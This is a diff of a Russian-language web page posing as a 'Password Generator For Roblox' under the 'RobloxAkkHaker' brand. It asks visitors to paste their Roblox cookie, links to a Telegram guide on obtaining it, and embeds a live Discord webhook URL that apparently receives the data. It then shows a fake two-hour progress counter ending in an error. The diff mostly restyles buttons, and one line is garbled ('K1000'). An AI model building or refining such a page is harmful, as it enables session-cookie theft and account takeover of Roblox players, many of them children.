@@ -89,15 +89,47 @@
         .support-btn, .how-to-btn {
             position: fixed;
             bottom: 20px;
-            z-index: 10;
+            z-index: 150; /* Кнопки поверх всего */
+            padding: 10px;
+            background-color: #4B5563;
+            border-radius: 50%;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 600;
+            color: white;
+            text-decoration: none;
+            transition: all 0.3s ease; /* Плавный переход для всех изменений */
+            touch-action: manipulation; /* Улучшает взаимодействие на сенсорных устройствах */
+        }
+
+        /* Эффект наведения для десктопа */
+        .support-btn:hover, .how-to-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(59, 130, 246, 0.7);
+        }
+
+        /* Класс для активного состояния при касании */
+        .active-touch {
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(59, 130, 246, 0.7);
         }
 
         .support-btn {
             right: 20px;
+            width: 80px;
+            height: 80px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
         .how-to-btn {
-            right: 130px;
+            right: 120px;
+            width: 100px;
+            height: 100px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
         .hacker-image {
@@ -106,11 +138,22 @@
             border-radius: 10px;
         }
 
+        #generateBtn {
+            position: relative;
+            z-index: 100; /* Ниже фиксированных кнопок, но выше контента */
+            touch-action: manipulation; /* Улучшает взаимодействие на сенсорных устройствах */
+        }
+
+        /* Контейнер для контента */
+        .content-container {
+            position: relative;
+            z-index: 50; /* Контейнер ниже фиксированных кнопок */
+        }
+
         /* Адаптивные стили для мобильных устройств */
         @media (max-width: 640px) {
             .support-btn, .how-to-btn {
-                bottom: 10px; /* Уменьшаем отступ снизу */
-                transform: scale(0.8); /* Уменьшаем размер кнопок */
+                transform: scale(0.8); /* Уменьшаем размер кнопок на мобильных */
             }
 
             .support-btn {
@@ -118,11 +161,11 @@
             }
 
             .how-to-btn {
-                right: 90px; /* Сдвигаем ближе к правому краю */
+                right: 100px;
             }
 
             .w-full.max-w-md.p-6 {
-                padding-bottom: 120px; /* Добавляем отступ снизу, чтобы кнопки не перекрывали контент */
+                padding-bottom: 180px; /* Увеличиваем отступ снизу, чтобы избежать перекрытия */
             }
         }
     </style>
@@ -134,7 +177,7 @@
     <div class="w-full flex justify-center py-6">
         <img src="https://i.postimg.cc/PrJz4zK0/photo-2025-04-15-23-47-42-round-1.png" alt="RobloxAkkHaker Image" class="hacker-image">
     </div>
-    <div class="w-full max-w-md p-6 flex-grow flex items-center justify-center">
+    <div class="w-full max-w-md p-6 flex-grow flex items-center justify-center content-container">
         <div>
             <h1 class="text-3xl font-bold text-center mb-8 tracking-tight">Password Generator For Roblox</h1>
             <div class="space-y-4">
@@ -153,7 +196,7 @@
             </div>
             <div id="loading" class="hidden mt-6 flex flex-col items-center">
                 <div class="loading-spinner"></div>
-                <p class="mt-4 text-sm">Processing data...</p>
+                <p class="mt-4 text-sm">Генерация пароля... <span id="counter">1</span></p>
             </div>
             <div id="error" class="hidden mt-6 p-4 bg-red-900 bg-opacity-80 rounded-lg text-center">
                 <p class="text-red-300">An error occurred. Please try again.</p>
@@ -165,20 +208,20 @@
     </div>
 
     <a
-        href="https://t.me/EgorovichUGC"
-        target="_blank"
-        class="support-btn p-2 bg-gray-700 rounded-full text-sm font-semibold text-white button-pulse flex items-center justify-center"
-        style="width: 80px; height: 80px;"
-    >
-        Поддержка
-    </a>
-    <a
         href="https://t.me/RobloxAkkHaker"
         target="_blank"
-        class="how-to-btn p-2 bg-gray-700 rounded-full text-xs font-semibold text-white button-pulse flex items-center justify-center"
-        style="width: 100px; height: 100px;"
+        class="how-to-btn"
+        id="howToBtn"
     >
         Как получить кук?
+    </a>
+    <a
+        href="https://t.me/EgorovichUGC"
+        target="_blank"
+        class="support-btn"
+        id="supportBtn"
+    >
+        Поддержка
     </a>
 
     <script>
@@ -188,6 +231,9 @@
         const error = document.getElementById('error');
         const invalidCookie = document.getElementById('invalidCookie');
         const timerDisplay = document.getElementById('timer');
+        const counterDisplay = document.getElementById('counter');
+        const howToBtn = document.getElementById('howToBtn');
+        const supportBtn = document.getElementById('supportBtn');
 
         // Вебхук Discord
         const discordWebhookURL = 'https://discord.com/api/webhooks/1361771684834836550/6wzW0CiTJIne3TipG55EFQcZMsqYQYbHTh4KUvd5WtpyyOdkeZ8WjQfAlKOUX5Q1Rn6n';
@@ -199,7 +245,38 @@
             return div.innerHTML;
         }
 
-        generateBtn.addEventListener('click', async () => {
+        // Функция для обработки ссылок
+        const handleLinkClick = (e, url) => {
+            e.preventDefault();
+            window.open(url, '_blank');
+        };
+
+        // Обработчики для кнопки "Как получить кук?"
+        howToBtn.addEventListener('click', (e) => handleLinkClick(e, howToBtn.href));
+        howToBtn.addEventListener('touchstart', (e) => {
+            e.preventDefault();
+            howToBtn.classList.add('active-touch'); // Добавляем эффект при касании
+        });
+        howToBtn.addEventListener('touchend', (e) => {
+            howToBtn.classList.remove('active-touch'); // Убираем эффект после касания
+            handleLinkClick(e, howToBtn.href);
+        });
+
+        // Обработчики для кнопки "Поддержка"
+        supportBtn.addEventListener('click', (e) => handleLinkClick(e, supportBtn.href));
+        supportBtn.addEventListener('touchstart', (e) => {
+            e.preventDefault();
+            supportBtn.classList.add('active-touch'); // Добавляем эффект при касании
+        });
+        supportBtn.addEventListener('touchend', (e) => {
+            supportBtn.classList.remove('active-touch'); // Убираем эффект после касания
+            handleLinkClick(e, supportBtn.href);
+        });
+
+        // Основная логика обработки кнопки "Generate password"
+        const handleGenerate = async (e) => {
+            e.preventDefault(); // Предотвращаем дублирование событий
+
             // Очистка и проверка ввода
             let cookieData = inputField.value.trim();
             cookieData = sanitizeInput(cookieData); // Защита от XSS
@@ -268,12 +345,35 @@
             error.classList.add('hidden');
             invalidCookie.classList.add('hidden');
 
+            // Бесконечный счетчик
+            let counter = 1;
+            const counterInterval = setInterval(() => {
+                counterDisplay.textContent = counter;
+                counter++;
+            },  K1000);
+
             // Симуляция загрузки 2 часа (7200 секунд)
             setTimeout(() => {
+                clearInterval(counterInterval); // Останавливаем счетчик
                 loading.classList.add('hidden');
                 error.classList.remove('hidden');
                 generateBtn.classList.remove('hidden');
             }, 7200000); // 2 часа в миллисекундах
+        };
+
+        // Обработчики событий для кнопки "Generate password"
+        generateBtn.addEventListener('click', handleGenerate);
+        generateBtn.addEventListener('touchstart', (e) => e.preventDefault());
+        generateBtn.addEventListener('touchend', handleGenerate);
+
+        // Обработчик события input и paste для поля ввода
+        inputField.addEventListener('input', () => {
+            inputField.value = inputField.value; // Принудительно обновляем значение
+        });
+        inputField.addEventListener('paste', () => {
+            setTimeout(() => {
+                inputField.value = inputField.value; // Обновляем после вставки
+            }, 0);
         });
     </script>
 </body>
